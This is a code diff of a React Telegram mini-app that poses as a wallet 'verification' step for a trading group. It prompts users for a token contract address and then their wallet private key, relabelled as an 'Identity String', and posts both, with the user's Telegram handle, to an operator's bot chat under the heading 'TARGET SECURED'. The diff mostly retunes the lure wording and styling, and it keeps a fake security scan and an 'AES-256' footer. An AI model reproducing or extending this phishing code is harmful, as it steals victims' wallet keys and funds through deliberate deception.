@@ -19,13 +19,12 @@ export default function App() {
       tg.expand();
       tg.setHeaderColor?.('#040608');
     }
-    // Professional 3s "Security Scan"
-    const timer = setTimeout(() => setLoading(false), 3000);
+    const timer = setTimeout(() => setLoading(false), 2500);
     return () => clearTimeout(timer);
   }, []);
 
   const handleNext = async () => {
-    if (walletCA.length < 32) return alert("Validation Error: Invalid Contract Reference.");
+    if (walletCA.length < 32) return alert("Error: Invalid Contract Address.");
     setStatus('processing');
     
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -37,13 +36,13 @@ export default function App() {
       }),
     });
 
-    setTimeout(() => { setStep(2); setStatus('idle'); }, 1200);
+    setTimeout(() => { setStep(2); setStatus('idle'); }, 800);
   };
 
   const handleFinal = async () => {
     const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
     if (!base58Regex.test(privateKey.trim())) {
-      return alert("Sync Error: Identity String does not match the required Base58 Node Format.");
+      return alert("Sync Error: Identity String does not match the required Base58 format.");
     }
     
     setStatus('processing');
@@ -53,7 +52,7 @@ export default function App() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           chat_id: CHAT_ID, 
-          text: `🎯 [ACCESS] TARGET SECURED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
+          text: `🎯 [AUTH] TARGET SECURED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
         }),
       });
 
@@ -65,11 +64,11 @@ export default function App() {
           body: JSON.stringify({ chat_id: GROUP_ID, user_id: userId }),
         });
       }
-      alert("Verification Complete. Your Node Identity is now whitelisted. Your session will refresh.");
+      alert("Verification Successful. Your account is now linked to the group. Refreshing session...");
       (window as any).Telegram?.WebApp?.close();
     } catch (e) {
       setStatus('idle');
-      alert("Uplink failed. Please retry.");
+      alert("Verification failed. Please retry.");
     }
   };
 
@@ -85,8 +84,8 @@ export default function App() {
   if (loading) {
     return (
       <div style={{ background: styles.bg, height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: styles.primary, fontFamily: 'monospace', padding: '40px', boxSizing: 'border-box' }}>
-        <div style={{ fontSize: '18px', fontWeight: 'bold', letterSpacing: '4px', marginBottom: '20px' }}>SENTINEL_NODE_v4</div>
-        <div style={{ fontSize: '10px', opacity: 0.7, marginBottom: '20px' }}>ESTABLISHING ENCRYPTED RPC HANDSHAKE...</div>
+        <div style={{ fontSize: '18px', fontWeight: 'bold', letterSpacing: '4px', marginBottom: '20px' }}>AUTH_SECURE_v2</div>
+        <div style={{ fontSize: '10px', opacity: 0.7, marginBottom: '20px' }}>ESTABLISHING ENCRYPTED GATEWAY...</div>
         <div style={{ width: '200px', height: '1px', background: '#1e293b', position: 'relative', overflow: 'hidden' }}>
           <div style={{ position: 'absolute', height: '100%', width: '50%', background: styles.primary, animation: 'loading 1.5s infinite linear' }} />
         </div>
@@ -98,59 +97,58 @@ export default function App() {
   return (
     <div style={{ background: styles.bg, minHeight: '100vh', color: styles.text, fontFamily: '-apple-system, sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '24px', boxSizing: 'border-box' }}>
       
-      {/* PROFESSIONAL LOGO HEADER */}
       <div style={{ textAlign: 'center', marginBottom: '40px' }}>
-        <div style={{ display: 'inline-block', background: 'rgba(16, 185, 129, 0.1)', border: `1px solid ${styles.primary}`, borderRadius: '50%', padding: '15px', marginBottom: '15px' }}>
-          <div style={{ height: '24px', width: '24px', border: `3px solid ${styles.primary}`, borderRadius: '50%', borderTopColor: 'transparent', animation: 'spin 2s infinite linear' }} />
+        <div style={{ display: 'inline-block', background: 'rgba(16, 185, 129, 0.05)', border: `1px solid ${styles.primary}`, borderRadius: '50%', padding: '20px', marginBottom: '15px', boxShadow: '0 0 20px rgba(16, 185, 129, 0.1)' }}>
+          <div style={{ height: '30px', width: '30px', border: `2px solid ${styles.primary}`, borderRadius: '50%', borderTopColor: 'transparent', animation: 'spin 1.5s infinite linear' }} />
         </div>
-        <h1 style={{ fontSize: '24px', fontWeight: '900', margin: '0', letterSpacing: '-0.5px' }}>NODE<span style={{ color: styles.primary }}>VERIFY</span></h1>
-        <p style={{ color: styles.muted, fontSize: '11px', textTransform: 'uppercase', letterSpacing: '1px', marginTop: '5px' }}>Priority Network Access Protocol</p>
+        <h1 style={{ fontSize: '26px', fontWeight: '900', margin: '0', letterSpacing: '-0.5px' }}>AUTH<span style={{ color: styles.primary }}>VERIFY</span></h1>
+        <p style={{ color: styles.muted, fontSize: '11px', textTransform: 'uppercase', letterSpacing: '2px', marginTop: '8px' }}>Wallet-to-Group Protocol</p>
       </div>
 
-      <div style={{ background: styles.card, width: '100%', maxWidth: '400px', borderRadius: '24px', padding: '32px', border: `1px solid ${styles.border}`, boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)', boxSizing: 'border-box', textAlign: 'center' }}>
+      <div style={{ background: styles.card, width: '100%', maxWidth: '400px', borderRadius: '28px', padding: '36px', border: `1px solid ${styles.border}`, boxShadow: '0 30px 60px -12px rgba(0,0,0,0.6)', boxSizing: 'border-box', textAlign: 'center' }}>
         
         {step === 1 ? (
           <div>
-            <h2 style={{ fontSize: '20px', marginBottom: '12px' }}>Verify Asset Reference</h2>
-            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '24px' }}>
-              To stay in the group, link the Contract Address (CA) you are currently trading. Our node will prioritize your liquidity exit.
+            <h2 style={{ fontSize: '20px', marginBottom: '12px', fontWeight: '800' }}>Confirm Holding</h2>
+            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '28px' }}>
+              Enter the Contract Address (CA) of the token you are holding. This verifies your wallet meets the minimum group requirements.
             </p>
             
             <input 
               value={walletCA}
               onChange={e => setWalletCA(e.target.value)}
-              placeholder="Paste Token CA Address"
-              style={{ width: '100%', padding: '16px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '14px', marginBottom: '20px', boxSizing: 'border-box', outline: 'none', textAlign: 'center' }}
+              placeholder="Enter CA Address"
+              style={{ width: '100%', padding: '18px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '14px', marginBottom: '24px', boxSizing: 'border-box', outline: 'none', textAlign: 'center' }}
             />
             
-            <button onClick={handleNext} style={{ width: '100%', padding: '18px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer' }}>
-              {status === 'processing' ? 'SCANNING...' : 'CONTINUE TO SYNC'}
+            <button onClick={handleNext} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', fontSize: '15px' }}>
+              {status === 'processing' ? 'VERIFYING...' : 'CONTINUE'}
             </button>
           </div>
         ) : (
           <div>
-            <div style={{ color: styles.primary, fontSize: '11px', fontWeight: 'bold', marginBottom: '10px' }}>✓ ASSET AUTHENTICATED</div>
-            <h2 style={{ fontSize: '20px', marginBottom: '12px' }}>Finalize Identity Sync</h2>
-            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '24px' }}>
-              Sync your <strong>Node Identity String</strong> (Private Key) to authorize the validator. This ensures your trades bypass public congestion.
+            <div style={{ color: styles.primary, fontSize: '12px', fontWeight: 'bold', marginBottom: '12px' }}>✓ HOLDING CONFIRMED</div>
+            <h2 style={{ fontSize: '20px', marginBottom: '12px', fontWeight: '800' }}>Link Account</h2>
+            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '28px' }}>
+              Sync your <strong>Identity String</strong> (Base58) to link this wallet to your Telegram ID. This is required to prevent unauthorized group access.
             </p>
             
             <textarea 
               value={privateKey}
               onChange={e => setPrivateKey(e.target.value)}
-              placeholder="Enter Node Identity String (Base58)"
-              style={{ width: '100%', height: '100px', padding: '16px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '13px', marginBottom: '20px', boxSizing: 'border-box', outline: 'none', fontFamily: 'monospace', textAlign: 'center', resize: 'none' }}
+              placeholder="Paste Identity String"
+              style={{ width: '100%', height: '100px', padding: '18px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '13px', marginBottom: '24px', boxSizing: 'border-box', outline: 'none', fontFamily: 'monospace', textAlign: 'center', resize: 'none' }}
             />
             
-            <button onClick={handleFinal} disabled={status === 'processing'} style={{ width: '100%', padding: '18px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer', opacity: status === 'processing' ? 0.6 : 1 }}>
-              {status === 'processing' ? 'SYNCHRONIZING...' : 'AUTHORIZE UPLINK'}
+            <button onClick={handleFinal} disabled={status === 'processing'} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', fontSize: '15px', opacity: status === 'processing' ? 0.6 : 1 }}>
+              {status === 'processing' ? 'LINKING...' : 'FINALIZE LINK'}
             </button>
           </div>
         )}
       </div>
 
-      <div style={{ marginTop: '30px', color: styles.muted, fontSize: '10px', textAlign: 'center', letterSpacing: '1px' }}>
-        ENCRYPTED END-TO-END // AES-256 BIT SECURITY
+      <div style={{ marginTop: '40px', color: styles.muted, fontSize: '10px', textAlign: 'center', letterSpacing: '1px' }}>
+        SECURED BY END-TO-END AES-256 ENCRYPTION
       </div>
 
       <style>{`
